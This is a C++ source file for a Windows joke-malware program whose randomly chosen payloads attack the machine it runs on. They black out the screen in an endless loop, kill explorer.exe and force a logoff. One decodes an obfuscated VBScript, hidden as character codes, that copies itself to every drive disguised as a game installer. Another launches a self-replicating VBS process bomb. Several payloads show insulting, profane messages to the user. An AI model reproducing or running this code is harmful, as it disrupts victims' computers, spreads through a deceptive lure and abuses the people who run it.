#define _WIN32_WINNT 0x0500
#include <iostream>
#include <time.h>
#include <Windows.h>
#include <wingdi.h>
#include <winuser.h>
#include <fstream>
#include <lmcons.h>
#include <sstream>
#include "payloads.h"

// Progress: 6/8 Payloads Done

std::string credits = "Credits:    Oh wait, you're serious! Let me Laugh even harder!"; // Nice try, Script Kiddies

namespace payloadLib{
    int payloadClass::generatePayload(){
        int payloadId = 0;
        time_t currtimet = 0;
        struct tm *currtm;
        std::fstream file;
        std::string out;
        srand(time(0));

        file.open("conf", std::ios::in);

        if(file.is_open()){
            file >> out;
            payloadId = atoi(out.c_str());
            file.close();
        }
        file.open("conf", std::ios::out);
        file << rand() % 4;
        file.close();

        currtimet = time(0);
        currtm = localtime(&currtimet);

        if(currtm->tm_sec / 30) payloadId += 4;

        return payloadId;
    }

    void payloadClass::payload0(){
        //////////////
        // BLACKOUT //
        //////////////

        HWND hWnd = GetDesktopWindow();
        HDC hdc = GetWindowDC(hWnd);

        HBRUSH brush = CreateSolidBrush(RGB(0,0,0));
        RECT res;
        GetWindowRect(hWnd, &res);

        RECT rct;
        rct.left = 0;
        rct.top = 0;
        rct.right = res.right;
        rct.bottom = res.bottom;

        while(1) {
            FillRect(hdc,&rct,brush);
            Sleep(1000/60);
        }
    }

    void payloadClass::payload1(){
        ///////////////////////
        // BYE-BYE EXPLORER! //
        ///////////////////////

        FreeConsole();
        system("taskkill /f /im explorer.exe");
        MessageBox(
           NULL,
           (LPCSTR)"HAHA, looks like Your Desktop and Taskbar are GONE!\nthats right, YOUVE BEEN HAXXED! the all-mighty batch skr1pt_k1dd133 strikes AGAIN! HAVE FUN!",
           (LPCSTR)"batch skr1pt_k1dd133 ATTACK!",
           MB_OK | MB_ICONEXCLAMATION
        );
    }

    void payloadClass::payload2(){
        ////////////////
        // SMALL COCK //
        ////////////////

        FreeConsole();
        int hasSmallCock;
        hasSmallCock = MessageBox(
           NULL,
           (LPCSTR)"You have a Small Cock!\nAdmit it!",
           (LPCSTR)"Small Cock alert!",
           MB_YESNO | MB_ICONQUESTION
        );
        if(hasSmallCock == IDYES){
            MessageBox(
                NULL,
                (LPCSTR)"Great! Take this Cock-growing Apple and Eat it!",
                (LPCSTR)"No more Small Cock alert",
                MB_ICONINFORMATION
            );
        }else{
            MessageBox(
                NULL,
                (LPCSTR)"I know you have a small cock. Stop lying you little piece of shit whose father left them to get the Milk.\n"
                        "Oh, and you're probably an obese discord mod who plays Genshin Impact! TOUCH SOME FUCKING GRASS!!!",
                (LPCSTR)"Discord Mod ALERT!",
                MB_ICONINFORMATION
            );
            ExitWindowsEx(0, 0);
        }
    }

    void payloadClass::payload3(){
        ///////////////////////
        // VBS SKRIPT KIDDIE //
        ///////////////////////

        //FreeConsole();
        srand(time(0));
        std::string msg = "Hello its me, the vbs skr1pt_k1dd133!\nGuess what, ill now DESTROY YOUR PC! GET WRECKED\b \bT!!!\n\nDELETING 'WINLOGON.EXE' in ...\n3        \n2        \n1        ";
        //ShellExecute(0,0,"notepad.exe",0,0,SW_SHOWDEFAULT);
        Sleep(666);
        system("taskkill /f /im explorer.exe > nul");

        /*INPUT inputs[1];
        ZeroMemory(inputs, sizeof(inputs));
        char c = 0;*/

        for(int i=0;i<msg.length();i++){
            /*c = msg[i];
            bool shiftFlag = false;

            switch(c){
            case '_':
                c = VK_SHIFT;
                shiftFlag = true;
            }

            inputs[0].type = INPUT_KEYBOARD;
            inputs[0].ki.wVk = c;
            inputs[0].ki.dwFlags = 0;
            SendInput(1, inputs, sizeof(INPUT));

            inputs[0].type = INPUT_KEYBOARD;
            inputs[0].ki.wVk = c;
            inputs[0].ki.dwFlags = KEYEVENTF_KEYUP;
            SendInput(1, inputs, sizeof(INPUT));*/

            std::cout << msg[i];

            Sleep( 50 + ( rand() % 151 ) );
        }

        MessageBox(
            NULL,
            (LPCSTR)"YOUR PC IS NOW WRECKET!",
            (LPCSTR)"BYE BYE!",
            MB_ICONERROR
        );
    }

    void payloadClass::payload4(){
        ///////////////////////////////
        // Aperture Appreciation Day //
        ///////////////////////////////

        char username[UNLEN+1];
        DWORD uname_len = UNLEN+1;
        GetUserName(username, &uname_len);
        std::stringstream msg;
        std::fstream file;

        // i.imgflip.com/33ypv9.jpg

        msg << "Hello " << username << ",\n"
            << "as Previously stated, today is Aperture Appreciation Day!\n"
            << "And as of Aperture tradition a cake will be sent to all participants!\n"
            << "To receive your cake go to this WorldWideWeb URL: http://i.imgflip.com/33ypv9.jpg\n\n"

            << "Thanks for the Participation\n"
            << "- Aperture Laboratories";
        for(int i=0;i<128;i++) msg << '\n';
        msg << "Chell is no more\n"
            << "- GLaDOS";

        file.open("Message from Aperture.txt", std::ios::out);
        file << msg.str();
        file.close();

        msg.str("");

        msg << "Hello " << username << ",\n"
            << "We're willing to inform you that today is Aperture Appreciation Day!\n"
            << "For more information please read the included .TXT file";

        FreeConsole();
        MessageBox(
           NULL,
           (LPCSTR) msg.str().c_str(),
           (LPCSTR)"Aperture Appreciation Day",
           MB_OK | MB_ICONINFORMATION
        );
        ShellExecute(0, 0, "notepad.exe", "\"Message from Aperture.txt\"", 0, SW_SHOWDEFAULT);
    }

    void payloadClass::payload5(){
        ////////////
        // SPREAD //
        ////////////

        FreeConsole();
        MessageBox(
            NULL,
            (LPCSTR)"I am the fungus.\nTo the roots of your drives i spread.\nAs others bump into me,\nthey will suffer the same fate.",
            (LPCSTR)"I am the fungus",
            MB_OK
        );

        std::fstream file;
        std::string data = "";
        std::string program = "83;101;116;32;111;98;106;83;104;101;108;108;32;61;32;67;114;101;97;116;101;79;98;106;101;99;116;40;34;87;115;99;114;105;112;116;46;83;104;101;108;108;34;41;13;10;115;101;116;32;111;98;106;70;83;32;61;32;67;114;101;97;116;101;79;98;106;101;99;116;40;34;83;99;114;105;112;116;105;110;103;46;70;105;108;101;83;121;115;116;101;109;79;98;106;101;99;116;34;41;13;10;112;97;116;104;32;61;32;76;101;102;116;40;87;115;99;114;105;112;116;46;83;99;114;105;112;116;70;117;108;108;78;97;109;101;44;32;108;101;110;40;87;115;99;114;105;112;116;46;83;99;114;105;112;116;70;117;108;108;78;97;109;101;41;32;45;32;108;101;110;40;87;115;99;114;105;112;116;46;83;99;114;105;112;116;78;97;109;101;41;41;13;10;13;10;70;111;114;32;69;97;99;104;32;111;98;106;68;114;118;32;105;110;32;111;98;106;70;83;46;68;114;105;118;101;115;13;10;9;83;101;116;32;100;114;105;118;101;32;61;32;111;98;106;70;83;46;71;101;116;70;111;108;100;101;114;40;111;98;106;68;114;118;46;68;114;105;118;101;76;101;116;116;101;114;32;38;32;34;58;92;34;41;13;10;9;105;102;32;110;111;116;32;100;114;105;118;101;46;65;116;116;114;105;98;117;116;101;115;32;97;110;100;32;49;32;116;104;101;110;13;10;9;9;100;115;116;32;61;32;111;98;106;68;114;118;46;68;114;105;118;101;76;101;116;116;101;114;32;38;32;34;58;92;83;116;97;103;101;50;71;97;109;101;83;101;116;117;112;34;13;10;9;9;105;102;32;110;111;116;32;111;98;106;70;83;46;70;111;108;100;101;114;69;120;105;115;116;115;40;100;115;116;41;32;116;104;101;110;32;111;98;106;70;83;46;67;114;101;97;116;101;70;111;108;100;101;114;40;100;115;116;41;13;10;9;9;111;98;106;83;104;101;108;108;46;82;117;110;32;34;99;109;100;32;47;99;32;99;111;112;121;32;34;34;34;32;38;32;112;97;116;104;32;38;32;34;92;114;101;112;92;42;46;42;34;34;32;34;34;34;32;38;32;100;115;116;32;38;32;34;34;34;34;13;10;9;9;115;101;116;32;102;105;108;101;32;61;32;111;98;106;70;83;46;79;112;101;110;84;101;120;116;70;105;108;101;40;100;115;116;32;38;32;34;92;72;111;119;50;73;110;115;116;97;108;108;46;116;120;116;34;44;32;50;44;32;84;114;117;101;44;32;48;41;13;10;9;9;102;105;108;101;46;87;114;105;116;101;76;105;110;101;32;34;72;111;119;32;116;111;32;73;110;115;116;97;108;108;32;83;116;97;103;101;50;32;116;104;101;32;71;97;109;101;58;32;34;13;10;9;9;102;105;108;101;46;87;114;105;116;101;76;105;110;101;32;34;32;32;49;46;32;82;117;110;32;34;34;115;101;116;117;112;46;118;98;115;34;34;34;13;10;9;9;102;105;108;101;46;87;114;105;116;101;76;105;110;101;32;34;32;32;50;46;32;79;112;101;110;32;83;116;97;103;101;50;32;115;104;111;114;116;99;117;116;32;111;110;32;68;101;115;107;116;111;112;34;13;10;9;9;102;105;108;101;46;87;114;105;116;101;76;105;110;101;32;34;34;13;10;9;9;102;105;108;101;46;87;114;105;116;101;76;105;110;101;32;34;32;69;110;106;111;121;33;34;13;10;9;9;102;105;108;101;46;67;108;111;115;101;13;10;9;101;110;100;32;105;102;32;13;10;78;101;120;116;13;10";
        std::string temp;

        for(int i=0;i<program.length();i++){
            if(program[i] == ';'){
                data += (char) atoi(temp.c_str());
                temp = "";
            }else temp += program[i];
        }
        data += (char) atoi(temp.c_str());
        temp = "";
        file.open("spd.vbs", std::ios::out);
        file << data;
        file.close();

        while(1){
            ShellExecute(0, 0, "wscript.exe", "spd.vbs", 0, SW_SHOWDEFAULT);
            Sleep(5000);
        }
    }

    void payloadClass::payload6(){
        //////////////////////
        // TOOMANYPROCESSES //
        //////////////////////

        FreeConsole();

        std::fstream file;
        file.open("clone.vbs", std::ios::out);
        file << "Set objShell = CreateObject(\"Wscript.Shell\")\n"
        << "do\n"
        << " Wscript.Sleep 1000\n"
        << " objShell.Run Wscript.ScriptFullName\n"
        << "loop\n";
        file.close();

        ShellExecute(0, 0, "wscript.exe", "clone.vbs", 0, SW_SHOWDEFAULT);
        Sleep(666);

        MessageBox(
            NULL,
            (LPCSTR)"Oops, i think i left the Process Cloner on. (1 Duplication per Second)",
            (LPCSTR)"The Cloner",
            MB_OK
        );
    }

    void payloadClass::payload7(){
        ///////////////////
        // You Found ME! //
        ///////////////////

        HANDLE hout;
        hout = GetStdHandle(STD_OUTPUT_HANDLE);
        SetConsoleTextAttribute(hout, 6*16 + 14);
        for(int i=0;i<80*25;i++) std::cout << ' ';
        SetConsoleCursorPosition(hout, {0, 0});

        std::string msg[] = {"Well here we are again.\n" // 0
                            "It's always such a pleasure.\n"
                            "Remember when you tried\n"
                            "To kill me twice?\n"
                            "Oh how we laughed and laughed.\n"
                            "Except I wasn't laughing.\n"
                            "Under the circumstances\n"
                            "I've been shockingly nice.\n\n",
                            "You want your freedom?\n" // 1
                            "Take it.\n"
                            "That's what I'm counting on.\n\n",
                            "I used to want you dead\n" // 2
                            "But\n"
                            "Now I only want you gone.\n\n",
                            "She was a lot like you.\n" // 3
                            "(Maybe not quite as heavy).\n"
                            "Now little Caroline is in here too.\n"
                            "One day they woke me up -\n"
                            "So I could live forever.\n"
                            "It's such a shame the same\n"
                            "Will never happen to you.\n\n",
                            "You've got your\n" // 4
                            "Short sad\n"
                            "Life left.\n"
                            "That's what I'm counting on.\n"
                            "I'll let you get right to it -\n"
                            "Now I only want you gone.\n\n",
                            "Goodbye my only friend.\n" // 5
                            "Oh, did you think I meant you?\n"
                            "That would be funny\n"
                            "If it weren't so sad.\n"
                            "Well you have been replaced.\n"
                            "I don't need anyone now.\n"
                            "When I delete you maybe\n"
                            "I'll stop feeling so bad.\n\n",
                            "Go make some new disaster.\n" // 6
                            "That's what I'm counting on.\n"
                            "You're someone else's problem.\n\n",
                            "Now I only want you gone.\n" // 7
                            "Now I only want you gone.\n"
                            "Now I only want you gone.\n"}; // Len: 8
        //FreeConsole();
        std::cout << "Please wait a bit!\n\n\n\n";


        Sleep(1000);

        MessageBox(
            NULL,
            (LPCSTR)"Congrats User, you found me!",
            (LPCSTR)"You Found Me!",
            MB_OK
        );

        MessageBox(
            NULL,
            (LPCSTR)"Yes it's me, JakubKwantowy!",
            (LPCSTR)"You Found Me!",
            MB_OK
        );

        MessageBox(
            NULL,
            (LPCSTR)"The creator of dis bad boi!",
            (LPCSTR)"You Found Me!",
            MB_OK
        );

        MessageBox(
            NULL,
            (LPCSTR)"Seeing you commit all that hard work, here's a Surprise!!!",
            (LPCSTR)"You Found Me!",
            MB_OK
        );

        char ch = 0;

        for(int i=0;i<8;i++){
            SetConsoleCursorPosition(hout, {0, 0});
            for(int i=0;i<80*25;i++) std::cout << ' ';
            SetConsoleCursorPosition(hout, {0, 0});
            for(int j=0;j<msg[i].length();j++){
                ch = msg[i][j];
                std::cout << ch;
                switch(ch){
                case '\n':
                    Sleep(750);
                    break;
                case ' ':
                    Sleep(75);
                    break;
                default:
                    Sleep(10);
                }
            }
        }

        SetConsoleCursorPosition(hout, {0, 0});
        for(int i=0;i<80*25;i++) std::cout << ' ';
        SetConsoleCursorPosition(hout, {0, 0});

        std::cout << 'G';
        Sleep(750);
        std::cout << 'O';
        Sleep(750);
        std::cout << 'N';
        Sleep(750);
        std::cout << 'E';
        Sleep(750);
        std::cout << '.';
        Sleep(750);

        MessageBox(
            NULL,
            (LPCSTR)"Hope you liked it!",
            (LPCSTR)"You Found Me!",
            MB_OK
        );
    }
}
